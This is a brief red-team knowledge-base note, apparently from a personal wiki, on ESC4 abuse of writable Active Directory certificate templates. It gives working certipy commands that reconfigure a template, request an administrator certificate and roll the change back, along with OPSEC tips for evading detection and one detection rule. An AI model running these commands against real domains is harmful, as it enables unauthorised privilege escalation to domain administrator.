---
title: "ESC4 — writable certificate-template ACL"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, acl-abuse, privilege-escalation]
---

# ESC4

Object-control ([[acl-abuse]]) applied to AD CS: a principal with
**WriteDacl / WriteOwner / WriteProperty / GenericWrite** over a **certificate
template** can **reconfigure the template into an [[esc1]]** (flip on
enrollee-supplied-SAN, add a client-auth EKU, grant itself enroll), request the
cert, then **restore the template**.

## Exploit

```bash
# certipy can reconfigure a template you control, exploit ESC1, and roll back
certipy template -u user@corp.local -p 'Pass' -template VulnTpl -save-old
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template VulnTpl \
  -upn administrator@corp.local
certipy template -u user@corp.local -p 'Pass' -template VulnTpl \
  -configuration VulnTpl.json   # restore
```

## Red-team notes (OPSEC)

- **Make it, use it, revert it** — the template object write fires **5136**;
  `-save-old` / restore keeps the window tiny and avoids leaving an ESC1 behind
  (which would be a gift to the next attacker *and* a lingering finding).
- The edge itself comes straight off a [[bloodhound]] path to the template.

## Detection

- **5136** on a `pKICertificateTemplate` object (DACL or property change) — very
  rare in normal ops, high fidelity.

## Links

- [[ad-cs-esc-attacks]], [[esc1]], [[acl-abuse]], [[certificate-templates]]
- [[certipy]], [[certified-pre-owned]]
